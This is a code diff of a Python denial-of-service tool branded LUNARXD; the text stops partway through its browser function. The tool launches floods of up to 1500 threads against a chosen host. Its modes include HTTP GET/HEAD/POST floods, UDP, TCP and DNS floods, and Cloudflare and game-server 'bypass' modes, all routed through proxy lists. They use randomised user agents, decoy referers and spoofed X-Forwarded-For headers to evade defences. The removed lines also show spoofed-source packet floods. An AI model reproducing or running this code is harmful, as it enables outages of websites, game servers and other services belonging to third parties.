@@ -6,33 +6,36 @@ import random
 import threading
 import sys
 import ssl
+import datetime
 import os
-import cv2
-import numpy as np
+import subprocess
+from pystyle import *
 from PIL import Image
 from colorama import Fore
-from pystyle import *
-import hashlib
-import base64
-from scapy.all import *  
-import asyncio
+import cv2
+import numpy as np
+import struct
+import binascii
 import warnings
+import hashlib
+import shutil
+import base64
 
 warnings.filterwarnings("ignore")
 
 COLOR_CODE = {
-    "RESET": "\033[0m",
+    "RESET": "\033[0m",  
     "UNDERLINE": "\033[04m",
-    "GREEN": "\033[32m",
-    "YELLOW": "\033[93m",
-    "RED": "\033[31m",
-    "CYAN": "\033[36m",
-    "BOLD": "\033[01m",
+    "GREEN": "\033[32m",     
+    "YELLOW": "\033[93m",    
+    "RED": "\033[31m",       
+    "CYAN": "\033[36m",     
+    "BOLD": "\033[01m",        
     "PINK": "\033[95m",
-    "URL_L": "\033[36m",
-    "LI_G": "\033[92m",
+    "URL_L": "\033[36m",       
+    "LI_G": "\033[92m",      
     "F_CL": "\033[0m",
-    "DARK": "\033[90m",
+    "DARK": "\033[90m",     
 }
 
 red = Fore.RED
@@ -47,8 +50,9 @@ def clearcs():
         os.system('clear')
 
 def play_ascii_video(video_path, frame_delay=1/128, duration=2.5):
-    ASCII_CHARS = "█▇▆▅▄▃▂▁ "
-    size = os.get_terminal_size()
+    ASCII_CHARS = "█▇▆▅▄▃▂▁ "  
+
+    size = shutil.get_terminal_size(fallback=(100, 40))
     term_width, term_height = size.columns, size.lines
     frame_width = term_width - 2
 
@@ -61,42 +65,55 @@ def play_ascii_video(video_path, frame_delay=1/128, duration=2.5):
     while cap.isOpened():
         if time.time() - start_time > duration:
             break
+
         ret, frame = cap.read()
         if not ret:
             break
+
         pil_image = Image.fromarray(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))
         width, height = pil_image.size
         aspect_ratio = height / width
+
         new_width = frame_width
         new_height = int(aspect_ratio * new_width * 0.5)
         new_height = min(new_height, term_height - 2)
+
         resized_image = pil_image.resize((new_width, new_height), Image.LANCZOS)
         resized_array = np.array(resized_image)
+
         gray = cv2.cvtColor(resized_array, cv2.COLOR_RGB2GRAY)
         intensities = gray.flatten()
+
         if intensities.max() != intensities.min():
             intensities = (intensities - intensities.min()) * 255 / (intensities.max() - intensities.min())
         else:
             intensities[:] = 0
+
         colors = resized_array.reshape(-1, 3)
+
         ascii_frame = ""
         for i in range(len(intensities)):
             char_idx = int((intensities[i] / 255) * (len(ASCII_CHARS) - 1))
             char = ASCII_CHARS[char_idx]
+
             r, g, b = colors[i]
             ascii_frame += f"\033[38;2;{r};{g};{b}m{char}"
+
             if (i + 1) % new_width == 0:
                 ascii_frame += "\n"
+
         ascii_frame += "\033[0m"
+
         os.system('cls' if os.name == 'nt' else 'clear')
         print(ascii_frame, end='', flush=True)
         time.sleep(frame_delay)
+
     cap.release()
     return True
-
+    
 def purple_to_green(text):
-    start_color = (128, 0, 128)
-    end_color = (0, 255, 0)
+    start_color = (128, 0, 128)  # Purple
+    end_color = (0, 255, 0)      # Green
     gradient = ""
     for i, char in enumerate(text):
         r = int(start_color[0] + (end_color[0] - start_color[0]) * (i / len(text)))
@@ -105,10 +122,10 @@ def purple_to_green(text):
         gradient += f"\033[38;2;{r};{g};{b}m{char}"
     gradient += "\033[0m"
     return gradient
-
+    
 def gold(text):
-    start_color = (255, 215, 0)
-    end_color = (255, 245, 200)
+    start_color = (255, 215, 0)  # Rich Gold
+    end_color = (255, 245, 200)  # Light Gold
     gradient = ""
     for i, char in enumerate(text):
         r = int(start_color[0] + (end_color[0] - start_color[0]) * (i / len(text)))
@@ -117,10 +134,10 @@ def gold(text):
         gradient += f"\033[38;2;{r};{g};{b}m{char}"
     gradient += "\033[0m"
     return gradient
-
+    
 def yellow_to_white(text):
-    start_color = (255, 255, 0)
-    end_color = (255, 255, 255)
+    start_color = (255, 255, 0)  # Yellow
+    end_color = (255, 255, 255)  # White
     gradient = ""
     for i, char in enumerate(text):
         r = int(start_color[0] + (end_color[0] - start_color[0]) * (i / len(text)))
@@ -131,8 +148,8 @@ def yellow_to_white(text):
     return gradient
 
 def gray_to_white(text):
-    start_color = (128, 128, 128)
-    end_color = (255, 255, 255)
+    start_color = (128, 128, 128)  # Gray
+    end_color = (255, 255, 255)  # White
     gradient = ""
     for i, char in enumerate(text):
         r = int(start_color[0] + (end_color[0] - start_color[0]) * (i / len(text)))
@@ -143,8 +160,8 @@ def gray_to_white(text):
     return gradient
 
 def green_to_white(text):
-    start_color = (0, 255, 0)
-    end_color = (255, 255, 255)
+    start_color = (0, 255, 0)  # Green
+    end_color = (255, 255, 255)  # White
     gradient = ""
     for i, char in enumerate(text):
         r = int(start_color[0] + (end_color[0] - start_color[0]) * (i / len(text)))
@@ -153,7 +170,7 @@ def green_to_white(text):
         gradient += f"\033[38;2;{r};{g};{b}m{char}"
     gradient += "\033[0m"
     return gradient
-
+    
 def runbanner():
     print(Colorate.Horizontal(Colors.cyan_to_blue, ("""╦  ╦ ╦╔╗╔╔═╗╦═╗
 ║  ║ ║║║║╠═╣╠╦╝
@@ -179,7 +196,10 @@ def bannerm2():
 
 def bannerm():
     cuser = input(Colorate.Horizontal(Colors.cyan_to_blue, "Username  ➤ "))
-    clearcs()
+    if os.name == 'nt':
+        os.system('cls')
+    else:
+        os.system('clear')
     banner = fr"""
 ʟᴜɴᴀʀxᴅ  •  ꜱᴇʀᴠɪɴɢ:  @{cuser}  ➵  ᴇxᴘɪʀʏ  :  ɴᴇᴠᴇʀ
 
@@ -200,25 +220,54 @@ def bannerm():
     print(Colorate.Horizontal(Colors.cyan_to_blue, Center.XCenter(banner)))
 
 acceptall = [
-    "Accept: text/html,application/xhtml+xml,application/xml QL=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+    "Accept-Encoding: gzip, deflate\r\n",
+    "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
+    "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
+    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
+    "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
+    "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
+    "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,",
+    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
+    "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8 | iso-8859-1;q=0.5, *;q=0.1\r\n",
+    "Accept: text/html, application/xhtml+xml",
+    "Accept-Language: en-US,en;q=0.5\r\n",
     "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
-    "Accept: text/html,application/xhtml+xml,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate, br\r\n",
+    "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
 ]
 
 referers = [
     "https://www.google.com/search?q=",
+    "https://check-host.net/",
     "https://www.facebook.com/",
     "https://www.youtube.com/",
+    "https://www.fbi.com/",
     "https://www.bing.com/search?q=",
-    "https://vk.com/",
-    "https://www.usatoday.com/",
+    "https://r.search.yahoo.com/",
+    "https://www.cia.gov/index.html",
+    "https://vk.com/profile.php?redirect=",
+    "https://www.usatoday.com/search/results?q=",
+    "https://help.baidu.com/searchResult?keywords=",
+    "https://steamcommunity.com/market/search?q=",
+    "https://www.ted.com/search?q=",
     "https://play.google.com/store/search?q=",
+    "https://www.qwant.com/search?q=",
+    "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
+    "https://www.google.ad/search?q=",
+    "https://www.google.ae/search?q=",
+    "https://www.google.com.af/search?q=",
+    "https://www.google.com.ag/search?q=",
+    "https://www.google.com.ai/search?q=",
+    "https://www.google.al/search?q=",
+    "https://www.google.am/search?q=",
+    "https://www.google.co.ao/search?q=",
 ]
 
-proxy_ver = "5"
+proxy_ver = "5"  # Default to SOCKS5
 brute = True
-out_file = "proxies.txt"
-thread_num = 300  
+out_file = "proxies.txt"  # Hardcoded proxy file
+thread_num = 1500
 data = ""
 cookies = ""
 strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
@@ -233,98 +282,186 @@ def load_proxies():
         if not proxies:
             print(Colorate.Horizontal(Colors.cyan_to_blue, "> Proxy file is empty."))
             return False
-        proxies = validate_proxies(proxies)
-        if not proxies:
-            print(Colorate.Horizontal(Colors.cyan_to_blue, "> No valid proxies found."))
-            return False
         return True
     except Exception as e:
         print(Colorate.Horizontal(Colors.cyan_to_blue, f"> Failed to load proxy file: {e}"))
         return False
 
-def validate_proxies(proxies):
-    valid_proxies = []
-    for proxy in proxies:
-        try:
-            ip, port = proxy.split(":")
-            s = socks.socksocket()
-            s.set_proxy(socks.SOCKS5, ip, int(port))
-            s.settimeout(0.5)
-            s.connect(("1.1.1.1", 80))
-            s.close()
-            valid_proxies.append(proxy)
-        except:
-            continue
-    return valid_proxies
-
 def build_threads(mode, thread_num, event, proxy_type, target_ip=None, target_port=None):
     if not proxies:
         print(Colorate.Horizontal(Colors.cyan_to_blue, "> No proxies loaded. Cannot start attack."))
         return
-    if mode in ["udpflood", "tcpflood", "dns", "udp-kill", "icmp-blast", "syn-strike"]:
+    if mode == "post":
         for _ in range(thread_num):
-            th = threading.Thread(target=scapy_layer4, args=(event, mode, target_ip, target_port))
+            th = threading.Thread(target=post, args=(event, proxy_type,))
             th.daemon = True
             th.start()
-    else:
+    elif mode == "cc":
         for _ in range(thread_num):
-            th = threading.Thread(target=globals()[mode], args=(event, proxy_type,))
+            th = threading.Thread(target=cc, args=(event, proxy_type,))
+            th.daemon = True
+            th.start()
+    elif mode == "head":
+        for _ in range(thread_num):
+            th = threading.Thread(target=head, args=(event, proxy_type,))
+            th.daemon = True
+            th.start()
+    elif mode == "udpflood":
+        for _ in range(thread_num):
+            th = threading.Thread(target=udpflood, args=(event, proxy_type, target_ip, target_port))
+            th.daemon = True
+            th.start()
+    elif mode == "tcpflood":
+        for _ in range(thread_num):
+            th = threading.Thread(target=tcpflood, args=(event, proxy_type, target_ip, target_port))
+            th.daemon = True
+            th.start()
+    elif mode == "dns":
+        for _ in range(thread_num):
+            th = threading.Thread(target=dns, args=(event, proxy_type, target_ip, target_port))
+            th.daemon = True
+            th.start()
+    elif mode == "uambypass":
+        for _ in range(thread_num):
+            th = threading.Thread(target=uambypass, args=(event, proxy_type,))
+            th.daemon = True
+            th.start()
+    elif mode == "browser":
+        for _ in range(thread_num):
+            th = threading.Thread(target=browser, args=(event, proxy_type,))
+            th.daemon = True
+            th.start()
+    elif mode == "home":
+        for _ in range(thread_num):
+            th = threading.Thread(target=home, args=(event, proxy_type,))
+            th.daemon = True
+            th.start()
+    elif mode == "cfbypass":
+        for _ in range(thread_num):
+            th = threading.Thread(target=cfbypass, args=(event, proxy_type,))
+            th.daemon = True
+            th.start()
+    elif mode == "tls":
+        for _ in range(thread_num):
+            th = threading.Thread(target=tls, args=(event, proxy_type,))
+            th.daemon = True
+            th.start()
+    elif mode == "udp-kill":
+        for _ in range(thread_num):
+            th = threading.Thread(target=udp_kill, args=(event, proxy_type, target_ip, target_port))
+            th.daemon = True
+            th.start()
+    elif mode == "ovh":
+        for _ in range(thread_num):
+            th = threading.Thread(target=ovh, args=(event, proxy_type,))
+            th.daemon = True
+            th.start()
+    elif mode == "dgb":
+        for _ in range(thread_num):
+            th = threading.Thread(target=dgb, args=(event, proxy_type,))
+            th.daemon = True
+            th.start()
+    elif mode == "http-storm":
+        for _ in range(thread_num):
+            th = threading.Thread(target=http_storm, args=(event, proxy_type,))
+            th.daemon = True
+            th.start()
+    elif mode == "api-killer":
+        for _ in range(thread_num):
+            th = threading.Thread(target=api_killer, args=(event, proxy_type,))
+            th.daemon = True
+            th.start()
+    elif mode == "icmp-blast":
+        for _ in range(thread_num):
+            th = threading.Thread(target=icmp_blast, args=(event, proxy_type, target_ip, target_port))
+            th.daemon = True
+            th.start()
+    elif mode == "syn-strike":
+        for _ in range(thread_num):
+            th = threading.Thread(target=syn_strike, args=(event, proxy_type, target_ip, target_port))
+            th.daemon = True
+            th.start()
+    elif mode == "game-crash":
+        for _ in range(thread_num):
+            th = threading.Thread(target=game_crash, args=(event, proxy_type, target_ip, target_port))
+            th.daemon = True
+            th.start()
+    elif mode == "lobby-flood":
+        for _ in range(thread_num):
+            th = threading.Thread(target=lobby_flood, args=(event, proxy_type, target_ip, target_port))
+            th.daemon = True
+            th.start()
+    elif mode == "discord":
+        for _ in range(thread_num):
+            th = threading.Thread(target=discord, args=(event, proxy_type, target_ip, target_port))
             th.daemon = True
             th.start()
 
 def getuseragent():
-    platform = Choice(['Windows', 'Macintosh', 'Linux'])
-    if platform == 'Windows':
-        os = Choice(['Windows NT 10.0; Win64; x64', 'Windows NT 6.1; Win64; x64'])
-    elif platform == 'Macintosh':
-        os = Choice(['Intel Mac OS X 10_15_7', 'Intel Mac OS X 11_0'])
-    elif platform == 'Linux':
-        os = Choice(['Linux x86_64', 'Linux i686'])
-    browser = Choice(['chrome', 'firefox'])
+    platform = Choice(['Macintosh', 'Windows', 'X11'])
+    if platform == 'Macintosh':
+        os = Choice(['68K', 'PPC', 'Intel Mac OS X'])
+    elif platform == 'Windows':
+        os = Choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows NT 10.0; Win64; x64'])
+    elif platform == 'X11':
+        os = Choice(['Linux i686', 'Linux x86_64'])
+    browser = Choice(['chrome', 'firefox', 'ie'])
     if browser == 'chrome':
-        version = f"{Intn(90, 120)}.0.{Intn(0, 9999)}.{Intn(0, 999)}"
-        return f"Mozilla/5.0 ({os}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version} Safari/537.36"
+        webkit = str(Intn(500, 599))
+        version = str(Intn(0, 99)) + '.0' + str(Intn(0, 9999)) + '.' + str(Intn(0, 999))
+        return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
     elif browser == 'firefox':
-        version = f"{Intn(80, 120)}.0"
-        return f"Mozilla/5.0 ({os}; rv:{version}) Gecko/20100101 Firefox/{version}"
+        currentYear = datetime.date.today().year
+        year = str(Intn(2020, currentYear))
+        month = Intn(1, 12)
+        if month < 10:
+            month = '0' + str(month)
+        else:
+            month = str(month)
+        day = Intn(1, 30)
+        if day < 10:
+            day = '0' + str(day)
+        else:
+            day = str(day)
+        gecko = year + month + day
+        version = str(Intn(1, 72)) + '.0'
+        return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
+    elif browser == 'ie':
+        version = str(Intn(1, 99)) + '.0'
+        engine = str(Intn(1, 99)) + '.0'
+        option = Choice([True, False])
+        if option:
+            token = Choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
+        else:
+            token = ''
+        return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'
 
 def randomurl():
-    return str(Intn(0, 999999999))
+    return str(Intn(0, 271400281257))
 
 def GenReqHeader(method):
     global data, target, path
     header = ""
-    if method in ["get", "head", "uambypass", "browser", "home", "cfbypass", "tls", "ovh", "dgb", "http_storm", "api_killer"]:
-        connection = "Connection: keep-alive\r\n"
-        if cookies:
-            connection += f"Cookie: {cookies}\r\n"
+    if method in ["get", "head", "uambypass", "browser", "home", "cfbypass", "tls", "ovh", "dgb", "http-storm", "api-killer"]:
+        connection = "Connection: Keep-Alive\r\n"
+        if cookies != "":
+            connection += "Cookies: " + str(cookies) + "\r\n"
         accept = Choice(acceptall)
-        referer = f"Referer: {Choice(referers)}{target}{path}\r\n"
-        useragent = f"User-Agent: {getuseragent()}\r\n"
+        referer = "Referer: " + Choice(referers) + target + path + "\r\n"
+        useragent = "User-Agent: " + getuseragent() + "\r\n"
         header = referer + useragent + accept + connection + "\r\n"
     elif method == "post":
-        post_host = f"POST {path} HTTP/1.1\r\nHost: {target}\r\n"
-        content = "Content-Type: application/x-www-form-urlencoded\r\n"
-        refer = f"Referer: http://{target}{path}\r\n"
-        user_agent = f"User-Agent: {getuseragent()}\r\n"
+        post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
+        content = "Content-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n"
+        refer = "Referer: http://" + target + path + "\r\n"
+        user_agent = "User-Agent: " + getuseragent() + "\r\n"
         accept = Choice(acceptall)
-        if not data:
-            data = random._urandom(1024)
-        length = f"Content-Length: {len(data)}\r\nConnection: keep-alive\r\n"
-        if cookies:
-            length += f"Cookie: {cookies}\r\n"
-        header = post_host + accept + refer + content + user_agent + length + "\n" + data.decode('latin1', errors='ignore') + "\r\n\r\n"
-    elif method == "api_killer":
-        post_host = f"POST {path} HTTP/1.1\r\nHost: {target}\r\n"
-        content = "Content-Type: application/json\r\n"
-        refer = f"Referer: https://{target}{path}\r\n"
-        user_agent = f"User-Agent: {getuseragent()}\r\n"
-        accept = Choice(acceptall)
-        payload = f'{{"data":"{random.choices(strings, k=1000)}"}}'
-        length = f"Content-Length: {len(payload)}\r\nConnection: keep-alive\r\n"
-        if cookies:
-            length += f"Cookie: {cookies}\r\n"
-        header = post_host + accept + refer + content + user_agent + length + "\n" + payload + "\r\n\r\n"
+        if data == "":
+            data = str(random._urandom(1024))
+        length = "Content-Length: " + str(len(data)) + " \r\nConnection: Keep-Alive\r\n"
+        if cookies != "":
+            length += "Cookies: " + str(cookies) + "\r\n"
+        header = post_host + accept + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
     return header
 
 def ParseUrl(original_url, is_layer4=False):
@@ -333,12 +470,13 @@ def ParseUrl(original_url, is_layer4=False):
     path = "/"
     protocol = "http"
     port = 80
+
     if is_layer4:
         try:
-            socket.inet_aton(original_url)
+            socket.inet_aton(original_url)  
             target = original_url
             return True
-        except:
+        except (socket.error, ValueError):
             print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid IP format. Use: <IP>"))
             return False
     else:
@@ -364,11 +502,12 @@ def ParseUrl(original_url, is_layer4=False):
             path = url.replace(website, "", 1)
         return True
 
-def solve_captcha(response_text, url):
-    if "captcha" not in response_text.lower() and "403" not in response_text:
+def solve_captcha(response_text):
+    if "captcha" not in response_text.lower():
         return None
-    token = base64.b64encode(hashlib.sha256(f"{url}{random.randint(1, 10000)}".encode()).hexdigest()[:16].encode()).decode()
-    return {"cf_clearance": token, "user-agent": getuseragent()}
+    captcha_key = hashlib.md5((response_text + str(random.randint(1, 10000))).encode()).hexdigest()[:8]
+    token = base64.b64encode(captcha_key.encode()).decode()
+    return {"captcha_token": token}
 
 def setup_socket(proxy_type, proxy):
     s = socks.socksocket()
@@ -381,51 +520,29 @@ def setup_socket(proxy_type, proxy):
         s.set_proxy(socks.HTTP, proxy_ip, int(proxy_port))
     if brute:
         s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-    s.settimeout(0.5)
+    s.settimeout(2)
     return s
-
-async def scapy_layer4(event, mode, target_ip, target_port):
-    event.wait()
-    pkt_size = 10240  
-    async def send_packets():
-        while event.is_set():
-            src_ip = spoof_source_ip()
-            if mode == "udpflood":
-                pkt = IP(src=src_ip, dst=target_ip)/UDP(sport=Intn(1024, 65535), dport=target_port)/Raw(load=os.urandom(pkt_size))
-            elif mode == "tcpflood":
-                pkt = IP(src=src_ip, dst=target_ip)/TCP(sport=Intn(1024, 65535), dport=target_port, flags="S")/Raw(load=os.urandom(pkt_size))
-            elif mode == "dns":
-                pkt = IP(src=src_ip, dst=target_ip)/UDP(sport=Intn(1024, 65535), dport=53)/DNS(rd=1, qd=DNSQR(qname=f"test{Intn(1,1000)}.com"))
-            elif mode == "udp-kill":
-                pkt = IP(src=src_ip, dst=target_ip)/UDP(sport=Intn(1024, 65535), dport=target_port)/Raw(load=b"FUCKYOU"*2048)
-            elif mode == "icmp-blast":
-                pkt = IP(src=src_ip, dst=target_ip)/ICMP()/Raw(load=os.urandom(256))
-            elif mode == "syn-strike":
-                pkt = IP(src=src_ip, dst=target_ip)/TCP(sport=Intn(1024, 65535), dport=target_port, flags="S")
-            send(pkt, verbose=False)
-            await asyncio.sleep(0.001)  
-    asyncio.run(send_packets())
 
 def cc(event, proxy_type):
     global proxies
     header = GenReqHeader("get")
     add = "?" if "?" not in path else "&"
     event.wait()
-    while event.is_set():
+    while True:
         s = None
         try:
             proxy = Choice(proxies)
             s = setup_socket(proxy_type, proxy)
-            s.connect((target, port))
+            s.connect((str(target), int(port)))
             if protocol == "https":
                 ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                 ctx.check_hostname = False
                 ctx.verify_mode = ssl.CERT_NONE
                 s = ctx.wrap_socket(s, server_hostname=target)
-            for _ in range(1000):
-                get_host = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n"
+            for _ in range(5000):
+                get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
                 request = get_host + header
-                sent = s.send(request.encode())
+                sent = s.send(str.encode(request))
                 if not sent:
                     break
             s.close()
@@ -438,21 +555,21 @@ def head(event, proxy_type):
     header = GenReqHeader("head")
     add = "?" if "?" not in path else "&"
     event.wait()
-    while event.is_set():
+    while True:
         s = None
         try:
             proxy = Choice(proxies)
             s = setup_socket(proxy_type, proxy)
-            s.connect((target, port))
+            s.connect((str(target), int(port)))
             if protocol == "https":
                 ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                 ctx.check_hostname = False
                 ctx.verify_mode = ssl.CERT_NONE
                 s = ctx.wrap_socket(s, server_hostname=target)
-            for _ in range(1000):
-                head_host = f"HEAD {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n"
+            for _ in range(5000):
+                head_host = "HEAD " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
                 request = head_host + header
-                sent = s.send(request.encode())
+                sent = s.send(str.encode(request))
                 if not sent:
                     break
             s.close()
@@ -464,368 +581,513 @@ def post(event, proxy_type):
     global proxies
     request = GenReqHeader("post")
     event.wait()
-    while event.is_set():
+    while True:
         s = None
         try:
             proxy = Choice(proxies)
             s = setup_socket(proxy_type, proxy)
-            s.connect((target, port))
+            s.connect((str(target), int(port)))
             if protocol == "https":
                 ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                 ctx.check_hostname = False
                 ctx.verify_mode = ssl.CERT_NONE
                 s = ctx.wrap_socket(s, server_hostname=target)
-            for _ in range(1000):
-                sent = s.send(request.encode())
+            for _ in range(5000):
+                sent = s.send(str.encode(request))
                 if not sent:
                     break
+            s.close()
+        except:
+            if s:
+                s.close()
+
+def udpflood(event, proxy_type, target_ip, target_port):
+    global proxies
+    payloads = [
+        generate_random_payload(1024),
+        generate_random_payload(2048),
+        generate_random_payload(512),
+    ]
+    event.wait()
+    while True:
+        s = None
+        try:
+            proxy = Choice(proxies)
+            s = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
+            proxy_ip, proxy_port = proxy.split(":")
+            if proxy_type == 4:
+                s.set_proxy(socks.SOCKS4, proxy_ip, int(proxy_port))
+            elif proxy_type == 5:
+                s.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
+            elif proxy_type == 0:
+                s.set_proxy(socks.HTTP, proxy_ip, int(proxy_port))
+            s.settimeout(2)
+            for _ in range(1000):
+                payload = Choice(payloads)
+                s.sendto(payload, (target_ip, target_port))
+                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                s.bind(("", Intn(1024, 65535)))
+            s.close()
+        except:
+            if s:
+                s.close()
+
+def tcpflood(event, proxy_type, target_ip, target_port):
+    global proxies
+    payloads = [
+        generate_random_payload(1024),
+        generate_random_payload(4096),
+        b"SYN" * 1000,
+    ]
+    event.wait()
+    while True:
+        s = None
+        try:
+            proxy = Choice(proxies)
+            s = setup_socket(proxy_type, proxy)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.connect((target_ip, target_port))
+            for _ in range(1000):
+                payload = Choice(payloads)
+                s.send(payload)
+                if random.random() < 0.1:
+                    s.close()
+                    s = setup_socket(proxy_type, proxy)
+                    s.connect((target_ip, target_port))
+            s.close()
+        except:
+            if s:
+                s.close()
+
+def dns(event, proxy_type, target_ip, target_port):
+    global proxies
+    dns_queries = [
+        b"\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + bytes(target_ip.encode()) + b"\x00\x00\x01\x00\x01",
+        b"\x00\x02\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + bytes(target_ip.encode()) + b"\x00\x00\x10\x00\x01",
+        b"\x00\x03\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + bytes(f"test{Intn(1,1000)}.com".encode()) + b"\x00\x00\x01\x00\x01",
+    ]
+    event.wait()
+    while True:
+        s = None
+        try:
+            proxy = Choice(proxies)
+            s = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
+            proxy_ip, proxy_port = proxy.split(":")
+            if proxy_type == 4:
+                s.set_proxy(socks.SOCKS4, proxy_ip, int(proxy_port))
+            elif proxy_type == 5:
+                s.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
+            elif proxy_type == 0:
+                s.set_proxy(socks.HTTP, proxy_ip, int(proxy_port))
+            s.settimeout(2)
+            for _ in range(1000):
+                query = Choice(dns_queries)
+                s.sendto(query, (target_ip, target_port if target_port else 53))
+                s.bind(("", Intn(1024, 65535)))
             s.close()
         except:
             if s:
                 s.close()
 
 def uambypass(event, proxy_type):
-    global proxies, cookies
+    global proxies
     add = "?" if "?" not in path else "&"
-    user_agent = getuseragent()
-    spoofed_ip = spoof_source_ip()
-    header = f"User-Agent: {user_agent}\r\nAccept: text/html,application/xhtml+xml,*/*;q=0.8\r\nReferer: {Choice(referers)}{target}{path}\r\nConnection: keep-alive\r\nX-Forwarded-For: {spoofed_ip}\r\n"
-    if cookies:
-        header += f"Cookie: {cookies}\r\n"
+    base_header = GenReqHeader("get")
+    user_agents = [getuseragent() for _ in range(10)]
+    spoofed_ips = [spoof_source_ip() for _ in range(10)]
+    prebuilt_requests = []
+    for ua in user_agents:
+        for ip in spoofed_ips:
+            modified_header = base_header.replace('User-Agent: ', f'User-Agent: {ua}\r\n')
+            request = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{modified_header}X-Forwarded-For: {ip}\r\n\r\n"
+            prebuilt_requests.append(request)
     event.wait()
-    while event.is_set():
+    while True:
         s = None
         try:
             proxy = Choice(proxies)
             s = setup_socket(proxy_type, proxy)
-            s.connect((target, port))
+            s.connect((str(target), int(port)))
             if protocol == "https":
                 ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                 ctx.check_hostname = False
                 ctx.verify_mode = ssl.CERT_NONE
                 s = ctx.wrap_socket(s, server_hostname=target)
-            for _ in range(1000):
-                request = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{header}\r\n"
-                sent = s.send(request.encode())
+            for _ in range(5000):
+                request = Choice(prebuilt_requests)
+                sent = s.send(str.encode(request))
                 if not sent:
                     break
-                try:
-                    response = s.recv(4096).decode('latin1', errors='ignore')
-                    captcha = solve_captcha(response, f"https://{target}{path}")
-                    if captcha:
-                        cookies = f"cf_clearance={captcha['cf_clearance']}"
-                        header = header.replace(f"User-Agent: {user_agent}", f"User-Agent: {captcha['user-agent']}")
-                except:
-                    pass
             s.close()
         except:
             if s:
                 s.close()
 
 def browser(event, proxy_type):
-    global proxies, cookies
+    global proxies
     add = "?" if "?" not in path else "&"
-    user_agent = getuseragent()
